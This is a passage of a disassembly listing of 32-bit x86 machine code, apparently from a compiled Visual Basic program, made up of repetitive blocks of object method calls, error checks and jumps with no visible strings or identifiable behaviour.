  40417e:	b8 08 00 00 00       	mov    $0x8,%eax
  404183:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404186:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40418d:	89 45 90             	mov    %eax,-0x70(%ebp)
  404190:	c7 85 58 ff ff ff 64 	movl   $0x402564,-0xa8(%ebp)
  404197:	25 40 00 
  40419a:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4041a0:	ff 15 ac 10 40 00    	call   *0x4010ac
  4041a6:	c7 85 68 ff ff ff dc 	movl   $0x4025dc,-0x98(%ebp)
  4041ad:	25 40 00 
  4041b0:	e9 5a fd ff ff       	jmp    0x403f0f
  4041b5:	8b 16                	mov    (%esi),%edx
  4041b7:	56                   	push   %esi
  4041b8:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4041be:	50                   	push   %eax
  4041bf:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4041c2:	50                   	push   %eax
  4041c3:	ff d3                	call   *%ebx
  4041c5:	8b 0e                	mov    (%esi),%ecx
  4041c7:	56                   	push   %esi
  4041c8:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4041ce:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4041d4:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4041d7:	50                   	push   %eax
  4041d8:	52                   	push   %edx
  4041d9:	ff d3                	call   *%ebx
  4041db:	8b 08                	mov    (%eax),%ecx
  4041dd:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4041e0:	52                   	push   %edx
  4041e1:	50                   	push   %eax
  4041e2:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4041e8:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4041ee:	85 c0                	test   %eax,%eax
  4041f0:	db e2                	fnclex
  4041f2:	7d 18                	jge    0x40420c
  4041f4:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  4041fa:	68 a0 00 00 00       	push   $0xa0
  4041ff:	68 b8 24 40 00       	push   $0x4024b8
  404204:	51                   	push   %ecx
  404205:	50                   	push   %eax
  404206:	ff 15 28 10 40 00    	call   *0x401028
  40420c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40420f:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404215:	89 45 98             	mov    %eax,-0x68(%ebp)
  404218:	b8 08 00 00 00       	mov    $0x8,%eax
  40421d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404220:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404227:	89 45 90             	mov    %eax,-0x70(%ebp)
  40422a:	c7 85 58 ff ff ff 6c 	movl   $0x40256c,-0xa8(%ebp)
  404231:	25 40 00 
  404234:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40423a:	ff 15 ac 10 40 00    	call   *0x4010ac
  404240:	c7 85 68 ff ff ff e4 	movl   $0x4025e4,-0x98(%ebp)
  404247:	25 40 00 
  40424a:	e9 77 0e 00 00       	jmp    0x4050c6
  40424f:	8b 0e                	mov    (%esi),%ecx
  404251:	56                   	push   %esi
  404252:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404258:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40425b:	50                   	push   %eax
  40425c:	52                   	push   %edx
  40425d:	ff d3                	call   *%ebx
  40425f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404265:	8b 06                	mov    (%esi),%eax
  404267:	56                   	push   %esi
  404268:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40426e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404271:	50                   	push   %eax
  404272:	51                   	push   %ecx
  404273:	ff d3                	call   *%ebx
  404275:	8b 10                	mov    (%eax),%edx
  404277:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40427a:	51                   	push   %ecx
  40427b:	50                   	push   %eax
  40427c:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404282:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404288:	85 c0                	test   %eax,%eax
  40428a:	db e2                	fnclex
  40428c:	7d 18                	jge    0x4042a6
  40428e:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404294:	68 a0 00 00 00       	push   $0xa0
  404299:	68 b8 24 40 00       	push   $0x4024b8
  40429e:	52                   	push   %edx
  40429f:	50                   	push   %eax
  4042a0:	ff 15 28 10 40 00    	call   *0x401028
  4042a6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4042a9:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4042af:	89 45 98             	mov    %eax,-0x68(%ebp)
  4042b2:	b8 08 00 00 00       	mov    $0x8,%eax
  4042b7:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4042ba:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4042c1:	89 45 90             	mov    %eax,-0x70(%ebp)
  4042c4:	c7 85 58 ff ff ff 74 	movl   $0x402574,-0xa8(%ebp)
  4042cb:	25 40 00 
  4042ce:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4042d4:	ff 15 ac 10 40 00    	call   *0x4010ac
  4042da:	c7 85 68 ff ff ff ec 	movl   $0x4025ec,-0x98(%ebp)
  4042e1:	25 40 00 
  4042e4:	e9 26 fc ff ff       	jmp    0x403f0f
  4042e9:	8b 16                	mov    (%esi),%edx
  4042eb:	56                   	push   %esi
  4042ec:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4042f2:	50                   	push   %eax
  4042f3:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4042f6:	50                   	push   %eax
  4042f7:	ff d3                	call   *%ebx
  4042f9:	8b 0e                	mov    (%esi),%ecx
  4042fb:	56                   	push   %esi
  4042fc:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404302:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404308:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40430b:	50                   	push   %eax
  40430c:	52                   	push   %edx
  40430d:	ff d3                	call   *%ebx
  40430f:	8b 08                	mov    (%eax),%ecx
  404311:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404314:	52                   	push   %edx
  404315:	50                   	push   %eax
  404316:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40431c:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404322:	85 c0                	test   %eax,%eax
  404324:	db e2                	fnclex
  404326:	7d 18                	jge    0x404340
  404328:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  40432e:	68 a0 00 00 00       	push   $0xa0
  404333:	68 b8 24 40 00       	push   $0x4024b8
  404338:	51                   	push   %ecx
  404339:	50                   	push   %eax
  40433a:	ff 15 28 10 40 00    	call   *0x401028
  404340:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404343:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404349:	89 45 98             	mov    %eax,-0x68(%ebp)
  40434c:	b8 08 00 00 00       	mov    $0x8,%eax
  404351:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404354:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40435b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40435e:	c7 85 58 ff ff ff 7c 	movl   $0x40257c,-0xa8(%ebp)
  404365:	25 40 00 
  404368:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40436e:	ff 15 ac 10 40 00    	call   *0x4010ac
  404374:	c7 85 68 ff ff ff f4 	movl   $0x4025f4,-0x98(%ebp)
  40437b:	25 40 00 
  40437e:	e9 43 0d 00 00       	jmp    0x4050c6
  404383:	8b 0e                	mov    (%esi),%ecx
  404385:	56                   	push   %esi
  404386:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40438c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40438f:	50                   	push   %eax
  404390:	52                   	push   %edx
  404391:	ff d3                	call   *%ebx
  404393:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404399:	8b 06                	mov    (%esi),%eax
  40439b:	56                   	push   %esi
  40439c:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4043a2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4043a5:	50                   	push   %eax
  4043a6:	51                   	push   %ecx
  4043a7:	ff d3                	call   *%ebx
  4043a9:	8b 10                	mov    (%eax),%edx
  4043ab:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4043ae:	51                   	push   %ecx
  4043af:	50                   	push   %eax
  4043b0:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4043b6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4043bc:	85 c0                	test   %eax,%eax
  4043be:	db e2                	fnclex
  4043c0:	7d 18                	jge    0x4043da
  4043c2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4043c8:	68 a0 00 00 00       	push   $0xa0
  4043cd:	68 b8 24 40 00       	push   $0x4024b8
  4043d2:	52                   	push   %edx
  4043d3:	50                   	push   %eax
  4043d4:	ff 15 28 10 40 00    	call   *0x401028
  4043da:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4043dd:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4043e3:	89 45 98             	mov    %eax,-0x68(%ebp)
  4043e6:	b8 08 00 00 00       	mov    $0x8,%eax
  4043eb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4043ee:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4043f5:	89 45 90             	mov    %eax,-0x70(%ebp)
  4043f8:	c7 85 58 ff ff ff 84 	movl   $0x402584,-0xa8(%ebp)
  4043ff:	25 40 00 
  404402:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404408:	ff 15 ac 10 40 00    	call   *0x4010ac
  40440e:	c7 85 68 ff ff ff fc 	movl   $0x4025fc,-0x98(%ebp)
  404415:	25 40 00 
  404418:	e9 f2 fa ff ff       	jmp    0x403f0f
  40441d:	8b 16                	mov    (%esi),%edx
  40441f:	56                   	push   %esi
  404420:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404426:	50                   	push   %eax
  404427:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40442a:	50                   	push   %eax
  40442b:	ff d3                	call   *%ebx
  40442d:	8b 0e                	mov    (%esi),%ecx
  40442f:	56                   	push   %esi
  404430:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404436:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40443c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40443f:	50                   	push   %eax
  404440:	52                   	push   %edx
  404441:	ff d3                	call   *%ebx
  404443:	8b 08                	mov    (%eax),%ecx
  404445:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404448:	52                   	push   %edx
  404449:	50                   	push   %eax
  40444a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404450:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404456:	85 c0                	test   %eax,%eax
  404458:	db e2                	fnclex
  40445a:	7d 18                	jge    0x404474
  40445c:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  404462:	68 a0 00 00 00       	push   $0xa0
  404467:	68 b8 24 40 00       	push   $0x4024b8
  40446c:	51                   	push   %ecx
  40446d:	50                   	push   %eax
  40446e:	ff 15 28 10 40 00    	call   *0x401028
  404474:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404477:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40447d:	89 45 98             	mov    %eax,-0x68(%ebp)
  404480:	b8 08 00 00 00       	mov    $0x8,%eax
  404485:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404488:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40448f:	89 45 90             	mov    %eax,-0x70(%ebp)
  404492:	c7 85 58 ff ff ff 8c 	movl   $0x40258c,-0xa8(%ebp)
  404499:	25 40 00 
  40449c:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4044a2:	ff 15 ac 10 40 00    	call   *0x4010ac
  4044a8:	c7 85 68 ff ff ff c4 	movl   $0x4025c4,-0x98(%ebp)
  4044af:	25 40 00 
  4044b2:	e9 0f 0c 00 00       	jmp    0x4050c6
  4044b7:	8b 0e                	mov    (%esi),%ecx
  4044b9:	56                   	push   %esi
  4044ba:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4044c0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4044c3:	50                   	push   %eax
  4044c4:	52                   	push   %edx
  4044c5:	ff d3                	call   *%ebx
  4044c7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4044cd:	8b 06                	mov    (%esi),%eax
  4044cf:	56                   	push   %esi
  4044d0:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4044d6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4044d9:	50                   	push   %eax
  4044da:	51                   	push   %ecx
  4044db:	ff d3                	call   *%ebx
  4044dd:	8b 10                	mov    (%eax),%edx
  4044df:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4044e2:	51                   	push   %ecx
  4044e3:	50                   	push   %eax
  4044e4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4044ea:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4044f0:	85 c0                	test   %eax,%eax
  4044f2:	db e2                	fnclex
  4044f4:	7d 18                	jge    0x40450e
  4044f6:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4044fc:	68 a0 00 00 00       	push   $0xa0
  404501:	68 b8 24 40 00       	push   $0x4024b8
  404506:	52                   	push   %edx
  404507:	50                   	push   %eax
  404508:	ff 15 28 10 40 00    	call   *0x401028
  40450e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404511:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404517:	89 45 98             	mov    %eax,-0x68(%ebp)
  40451a:	b8 08 00 00 00       	mov    $0x8,%eax
  40451f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404522:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404529:	89 45 90             	mov    %eax,-0x70(%ebp)
  40452c:	c7 85 58 ff ff ff 94 	movl   $0x402594,-0xa8(%ebp)
  404533:	25 40 00 
  404536:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40453c:	ff 15 ac 10 40 00    	call   *0x4010ac
  404542:	c7 85 68 ff ff ff 04 	movl   $0x402604,-0x98(%ebp)
  404549:	26 40 00 
  40454c:	e9 be f9 ff ff       	jmp    0x403f0f
  404551:	8b 16                	mov    (%esi),%edx
  404553:	56                   	push   %esi
  404554:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40455a:	50                   	push   %eax
  40455b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40455e:	50                   	push   %eax
  40455f:	ff d3                	call   *%ebx
  404561:	8b 0e                	mov    (%esi),%ecx
  404563:	56                   	push   %esi
  404564:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40456a:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404570:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404573:	50                   	push   %eax
  404574:	52                   	push   %edx
  404575:	ff d3                	call   *%ebx
  404577:	8b 08                	mov    (%eax),%ecx
  404579:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40457c:	52                   	push   %edx
  40457d:	50                   	push   %eax
  40457e:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404584:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40458a:	85 c0                	test   %eax,%eax
  40458c:	db e2                	fnclex
  40458e:	7d 18                	jge    0x4045a8
  404590:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  404596:	68 a0 00 00 00       	push   $0xa0
  40459b:	68 b8 24 40 00       	push   $0x4024b8
  4045a0:	51                   	push   %ecx
  4045a1:	50                   	push   %eax
  4045a2:	ff 15 28 10 40 00    	call   *0x401028
  4045a8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4045ab:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4045b1:	89 45 98             	mov    %eax,-0x68(%ebp)
  4045b4:	b8 08 00 00 00       	mov    $0x8,%eax
  4045b9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4045bc:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4045c3:	89 45 90             	mov    %eax,-0x70(%ebp)
  4045c6:	c7 85 58 ff ff ff 9c 	movl   $0x40259c,-0xa8(%ebp)
  4045cd:	25 40 00 
  4045d0:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4045d6:	ff 15 ac 10 40 00    	call   *0x4010ac
  4045dc:	c7 85 68 ff ff ff 0c 	movl   $0x40260c,-0x98(%ebp)
  4045e3:	26 40 00 
  4045e6:	e9 db 0a 00 00       	jmp    0x4050c6
  4045eb:	8b 0e                	mov    (%esi),%ecx
  4045ed:	56                   	push   %esi
  4045ee:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4045f4:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4045f7:	50                   	push   %eax
  4045f8:	52                   	push   %edx
  4045f9:	ff d3                	call   *%ebx
  4045fb:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404601:	8b 06                	mov    (%esi),%eax
  404603:	56                   	push   %esi
  404604:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40460a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40460d:	50                   	push   %eax
  40460e:	51                   	push   %ecx
  40460f:	ff d3                	call   *%ebx
  404611:	8b f8                	mov    %eax,%edi
  404613:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404616:	50                   	push   %eax
  404617:	57                   	push   %edi
  404618:	8b 17                	mov    (%edi),%edx
  40461a:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404620:	85 c0                	test   %eax,%eax
  404622:	db e2                	fnclex
  404624:	7d 12                	jge    0x404638
  404626:	68 a0 00 00 00       	push   $0xa0
  40462b:	68 b8 24 40 00       	push   $0x4024b8
  404630:	57                   	push   %edi
  404631:	50                   	push   %eax
  404632:	ff 15 28 10 40 00    	call   *0x401028
  404638:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40463b:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404641:	52                   	push   %edx
  404642:	68 18 26 40 00       	push   $0x402618
  404647:	8b 39                	mov    (%ecx),%edi
  404649:	ff 15 20 10 40 00    	call   *0x401020
  40464f:	8b d0                	mov    %eax,%edx
  404651:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404654:	ff 15 b8 10 40 00    	call   *0x4010b8
  40465a:	89 bd 74 fe ff ff    	mov    %edi,-0x18c(%ebp)
  404660:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404666:	50                   	push   %eax
  404667:	8b 85 74 fe ff ff    	mov    -0x18c(%ebp),%eax
  40466d:	57                   	push   %edi
  40466e:	e9 e6 f0 ff ff       	jmp    0x403759
  404673:	8b 16                	mov    (%esi),%edx
  404675:	56                   	push   %esi
  404676:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40467c:	50                   	push   %eax
  40467d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404680:	50                   	push   %eax
  404681:	ff d3                	call   *%ebx
  404683:	8b 0e                	mov    (%esi),%ecx
  404685:	56                   	push   %esi
  404686:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40468c:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404692:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404695:	50                   	push   %eax
  404696:	52                   	push   %edx
  404697:	ff d3                	call   *%ebx
  404699:	8b f8                	mov    %eax,%edi
  40469b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40469e:	51                   	push   %ecx
  40469f:	57                   	push   %edi
  4046a0:	8b 07                	mov    (%edi),%eax
  4046a2:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4046a8:	85 c0                	test   %eax,%eax
  4046aa:	db e2                	fnclex
  4046ac:	7d 12                	jge    0x4046c0
  4046ae:	68 a0 00 00 00       	push   $0xa0
  4046b3:	68 b8 24 40 00       	push   $0x4024b8
  4046b8:	57                   	push   %edi
  4046b9:	50                   	push   %eax
  4046ba:	ff 15 28 10 40 00    	call   *0x401028
  4046c0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4046c3:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4046c9:	50                   	push   %eax
  4046ca:	68 28 26 40 00       	push   $0x402628
  4046cf:	8b 3a                	mov    (%edx),%edi
  4046d1:	ff 15 20 10 40 00    	call   *0x401020
  4046d7:	8b d0                	mov    %eax,%edx
  4046d9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4046dc:	ff 15 b8 10 40 00    	call   *0x4010b8
  4046e2:	8b cf                	mov    %edi,%ecx
  4046e4:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4046ea:	50                   	push   %eax
  4046eb:	57                   	push   %edi
  4046ec:	e9 86 17 00 00       	jmp    0x405e77
  4046f1:	8b 06                	mov    (%esi),%eax
  4046f3:	56                   	push   %esi
  4046f4:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4046fa:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4046fd:	50                   	push   %eax
  4046fe:	51                   	push   %ecx
  4046ff:	ff d3                	call   *%ebx
  404701:	8b 16                	mov    (%esi),%edx
  404703:	56                   	push   %esi
  404704:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40470a:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404710:	50                   	push   %eax
  404711:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404714:	50                   	push   %eax
  404715:	ff d3                	call   *%ebx
  404717:	8b f8                	mov    %eax,%edi
  404719:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40471c:	52                   	push   %edx
  40471d:	57                   	push   %edi
  40471e:	8b 0f                	mov    (%edi),%ecx
  404720:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404726:	85 c0                	test   %eax,%eax
  404728:	db e2                	fnclex
  40472a:	7d 12                	jge    0x40473e
  40472c:	68 a0 00 00 00       	push   $0xa0
  404731:	68 b8 24 40 00       	push   $0x4024b8
  404736:	57                   	push   %edi
  404737:	50                   	push   %eax
  404738:	ff 15 28 10 40 00    	call   *0x401028
  40473e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404741:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404747:	51                   	push   %ecx
  404748:	68 38 26 40 00       	push   $0x402638
  40474d:	8b 38                	mov    (%eax),%edi
  40474f:	ff 15 20 10 40 00    	call   *0x401020
  404755:	8b d0                	mov    %eax,%edx
  404757:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40475a:	ff 15 b8 10 40 00    	call   *0x4010b8
  404760:	8b d7                	mov    %edi,%edx
  404762:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404768:	50                   	push   %eax
  404769:	57                   	push   %edi
  40476a:	e9 52 ef ff ff       	jmp    0x4036c1
  40476f:	8b 0e                	mov    (%esi),%ecx
  404771:	56                   	push   %esi
  404772:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404778:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40477b:	50                   	push   %eax
  40477c:	52                   	push   %edx
  40477d:	ff d3                	call   *%ebx
  40477f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404785:	8b 06                	mov    (%esi),%eax
  404787:	56                   	push   %esi
  404788:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40478e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404791:	50                   	push   %eax
  404792:	51                   	push   %ecx
  404793:	ff d3                	call   *%ebx
  404795:	8b f8                	mov    %eax,%edi
  404797:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40479a:	50                   	push   %eax
  40479b:	57                   	push   %edi
  40479c:	8b 17                	mov    (%edi),%edx
  40479e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4047a4:	85 c0                	test   %eax,%eax
  4047a6:	db e2                	fnclex
  4047a8:	7d 12                	jge    0x4047bc
  4047aa:	68 a0 00 00 00       	push   $0xa0
  4047af:	68 b8 24 40 00       	push   $0x4024b8
  4047b4:	57                   	push   %edi
  4047b5:	50                   	push   %eax
  4047b6:	ff 15 28 10 40 00    	call   *0x401028
  4047bc:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4047bf:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4047c5:	52                   	push   %edx
  4047c6:	68 48 26 40 00       	push   $0x402648
  4047cb:	8b 39                	mov    (%ecx),%edi
  4047cd:	ff 15 20 10 40 00    	call   *0x401020
  4047d3:	8b d0                	mov    %eax,%edx
  4047d5:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4047d8:	ff 15 b8 10 40 00    	call   *0x4010b8
  4047de:	89 bd 68 fe ff ff    	mov    %edi,-0x198(%ebp)
  4047e4:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4047ea:	50                   	push   %eax
  4047eb:	8b 85 68 fe ff ff    	mov    -0x198(%ebp),%eax
  4047f1:	57                   	push   %edi
  4047f2:	e9 62 ef ff ff       	jmp    0x403759
  4047f7:	8b 16                	mov    (%esi),%edx
  4047f9:	56                   	push   %esi
  4047fa:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404800:	50                   	push   %eax
  404801:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404804:	50                   	push   %eax
  404805:	ff d3                	call   *%ebx
  404807:	8b 0e                	mov    (%esi),%ecx
  404809:	56                   	push   %esi
  40480a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404810:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404816:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404819:	50                   	push   %eax
  40481a:	52                   	push   %edx
  40481b:	ff d3                	call   *%ebx
  40481d:	8b f8                	mov    %eax,%edi
  40481f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404822:	51                   	push   %ecx
  404823:	57                   	push   %edi
  404824:	8b 07                	mov    (%edi),%eax
  404826:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40482c:	85 c0                	test   %eax,%eax
  40482e:	db e2                	fnclex
  404830:	7d 12                	jge    0x404844
  404832:	68 a0 00 00 00       	push   $0xa0
  404837:	68 b8 24 40 00       	push   $0x4024b8
  40483c:	57                   	push   %edi
  40483d:	50                   	push   %eax
  40483e:	ff 15 28 10 40 00    	call   *0x401028
  404844:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404847:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40484d:	50                   	push   %eax
  40484e:	68 58 26 40 00       	push   $0x402658
  404853:	8b 3a                	mov    (%edx),%edi
  404855:	ff 15 20 10 40 00    	call   *0x401020
  40485b:	8b d0                	mov    %eax,%edx
  40485d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404860:	ff 15 b8 10 40 00    	call   *0x4010b8
  404866:	8b cf                	mov    %edi,%ecx
  404868:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40486e:	50                   	push   %eax
  40486f:	57                   	push   %edi
  404870:	e9 02 16 00 00       	jmp    0x405e77
  404875:	8b 06                	mov    (%esi),%eax
  404877:	56                   	push   %esi
  404878:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40487e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404881:	50                   	push   %eax
  404882:	51                   	push   %ecx
  404883:	ff d3                	call   *%ebx
  404885:	8b 16                	mov    (%esi),%edx
  404887:	56                   	push   %esi
  404888:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40488e:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404894:	50                   	push   %eax
  404895:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404898:	50                   	push   %eax
  404899:	ff d3                	call   *%ebx
  40489b:	8b f8                	mov    %eax,%edi
  40489d:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4048a0:	52                   	push   %edx
  4048a1:	57                   	push   %edi
  4048a2:	8b 0f                	mov    (%edi),%ecx
  4048a4:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4048aa:	85 c0                	test   %eax,%eax
  4048ac:	db e2                	fnclex
  4048ae:	7d 12                	jge    0x4048c2
  4048b0:	68 a0 00 00 00       	push   $0xa0
  4048b5:	68 b8 24 40 00       	push   $0x4024b8
  4048ba:	57                   	push   %edi
  4048bb:	50                   	push   %eax
  4048bc:	ff 15 28 10 40 00    	call   *0x401028
  4048c2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4048c5:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4048cb:	51                   	push   %ecx
  4048cc:	68 68 26 40 00       	push   $0x402668
  4048d1:	8b 38                	mov    (%eax),%edi
  4048d3:	ff 15 20 10 40 00    	call   *0x401020
  4048d9:	8b d0                	mov    %eax,%edx
  4048db:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4048de:	ff 15 b8 10 40 00    	call   *0x4010b8
  4048e4:	8b d7                	mov    %edi,%edx
  4048e6:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
